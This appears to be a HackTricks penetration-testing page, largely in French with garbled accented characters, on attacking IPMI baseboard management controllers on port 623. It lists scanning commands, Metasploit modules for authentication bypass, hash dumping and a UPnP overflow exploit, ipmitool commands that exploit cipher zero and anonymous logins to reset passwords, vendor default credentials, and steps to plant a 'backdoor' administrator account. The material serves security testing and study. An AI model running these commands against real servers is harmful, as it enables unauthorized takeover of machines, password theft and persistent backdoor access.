# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

### **Aper√ßu de l'IPMI**

**[Interface de gestion de plate-forme intelligente (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** offre une approche standardis√©e pour la gestion √† distance et la surveillance des syst√®mes informatiques, ind√©pendamment du syst√®me d'exploitation ou de l'√©tat de l'alimentation. Cette technologie permet aux administrateurs syst√®me de g√©rer les syst√®mes √† distance, m√™me lorsqu'ils sont √©teints ou non r√©actifs, et est particuli√®rement utile pour :

- Configurations de d√©marrage pr√©-OS
- Gestion de l'extinction
- R√©cup√©ration des pannes syst√®me

L'IPMI est capable de surveiller les temp√©ratures, les tensions, les vitesses des ventilateurs et les alimentations √©lectriques, tout en fournissant des informations d'inventaire, en examinant les journaux mat√©riels et en envoyant des alertes via SNMP. Pour son fonctionnement, une source d'alimentation et une connexion LAN sont essentielles.

Depuis son introduction par Intel en 1998, l'IPMI est pris en charge par de nombreux fournisseurs, am√©liorant les capacit√©s de gestion √† distance, notamment avec le support de la version 2.0 pour la liaison s√©rie sur LAN. Les composants cl√©s comprennent :

- **Contr√¥leur de gestion de carte m√®re (BMC) :** Le microcontr√¥leur principal pour les op√©rations IPMI.
- **Bus et interfaces de communication :** Pour la communication interne et externe, y compris ICMB, IPMB, et diverses interfaces pour les connexions locales et r√©seau.
- **M√©moire IPMI :** Pour stocker les journaux et les donn√©es.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Port par d√©faut** : 623/UDP/TCP (Il est g√©n√©ralement en UDP mais peut √©galement fonctionner en TCP)

## √ânum√©ration

### D√©couverte
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Vous pouvez **identifier** la **version** en utilisant :
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### Vuln√©rabilit√©s IPMI

Dans le domaine de l'IPMI 2.0, une faille de s√©curit√© significative a √©t√© d√©couverte par Dan Farmer, exposant une vuln√©rabilit√© √† travers le **type de chiffrement 0**. Cette vuln√©rabilit√©, document√©e en d√©tail dans la recherche de [Dan Farmer](http://fish2.com/ipmi/cipherzero.html), permet un acc√®s non autoris√© avec n'importe quel mot de passe tant qu'un utilisateur valide est cibl√©. Cette faiblesse a √©t√© trouv√©e sur divers BMC de fabricants tels que HP, Dell et Supermicro, sugg√©rant un probl√®me g√©n√©ralis√© dans toutes les impl√©mentations de l'IPMI 2.0.

### **Contournement de l'authentification IPMI via le chiffrement 0**

Pour d√©tecter cette faille, le scanner auxiliaire Metasploit suivant peut √™tre utilis√© :
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
L'exploitation de cette faille est r√©alisable avec `ipmitool`, comme d√©montr√© ci-dessous, permettant ainsi la liste et la modification des mots de passe des utilisateurs :
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **R√©cup√©ration √† distance du hachage du mot de passe pour l'authentification RAKP d'IPMI 2.0**

Cette vuln√©rabilit√© permet la r√©cup√©ration des mots de passe hach√©s sal√©s (MD5 et SHA1) pour n'importe quel nom d'utilisateur existant. Pour tester cette vuln√©rabilit√©, Metasploit propose un module :
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **Authentification anonyme IPMI**

Une configuration par d√©faut dans de nombreux BMC permet l'acc√®s "anonyme", caract√©ris√© par des cha√Ænes de nom d'utilisateur et de mot de passe nulles. Cette configuration peut √™tre exploit√©e pour r√©initialiser les mots de passe des comptes d'utilisateurs nomm√©s en utilisant `ipmitool` :
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Mots de passe en clair IPMI Supermicro**

Un choix de conception critique dans l'IPMI 2.0 n√©cessite le stockage des mots de passe en clair dans les BMC pour des raisons d'authentification. Le stockage de ces mots de passe par Supermicro dans des emplacements tels que `/nv/PSBlock` ou `/nv/PSStore` soul√®ve des pr√©occupations de s√©curit√© importantes :
```bash
cat /nv/PSBlock
```
### **Vuln√©rabilit√© UPnP de Supermicro IPMI**

L'inclusion par Supermicro d'un √©couteur UPnP SSDP dans son micrologiciel IPMI, en particulier sur le port UDP 1900, introduit un risque de s√©curit√© grave. Les vuln√©rabilit√©s dans le SDK Intel pour les appareils UPnP version 1.3.1, telles que d√©taill√©es par [la divulgation de Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), permettent un acc√®s root au BMC:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP randomizes the default password** for its **Integrated Lights Out (iLO)** product during manufacture. This practice contrasts with other manufacturers, who tend to use **static default credentials**. A summary of default usernames and passwords for various products is provided as follows:

- **HP Integrated Lights Out (iLO)** uses a **factory randomized 8-character string** as its default password, showcasing a higher security level.
- Products like **Dell's iDRAC, IBM's IMM**, and **Fujitsu's Integrated Remote Management Controller** use easily guessable passwords such as "calvin", "PASSW0RD" (with a zero), and "admin" respectively.
- Similarly, **Supermicro IPMI (2.0), Oracle/Sun ILOM**, and **ASUS iKVM BMC** also use simple default credentials, with "ADMIN", "changeme", and "admin" serving as their passwords.


## Accessing the Host via BMC

Administrative access to the Baseboard Management Controller (BMC) opens various pathways for accessing the host's operating system. A straightforward approach involves exploiting the BMC's Keyboard, Video, Mouse (KVM) functionality. This can be done by either rebooting the host to a root shell via GRUB (using `init=/bin/sh`) or booting from a virtual CD-ROM set as a rescue disk. Such methods allow for direct manipulation of the host's disk, including the insertion of backdoors, data extraction, or any necessary actions for a security assessment. However, this requires rebooting the host, which is a significant drawback. Without rebooting, accessing the running host is more complex and varies with the host's configuration. If the host's physical or serial console remains logged in, it can easily be taken over through the BMC's KVM or serial-over-LAN (sol) functionalities via `ipmitool`. Exploring the exploitation of shared hardware resources, like the i2c bus and Super I/O chip, is an area that demands further investigation.

## Introducing Backdoors into BMC from the Host

Upon compromising a host equipped with a BMC, the **local BMC interface can be leveraged to insert a backdoor user account**, creating a lasting presence on the server. This attack necessitates the presence of **`ipmitool`** on the compromised host and the activation of BMC driver support. The following commands illustrate how a new user account can be injected into the BMC using the host's local interface, which bypasses the need for authentication. This technique is applicable to a wide range of operating systems including Linux, Windows, BSD, and even DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## R√©f√©rences

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
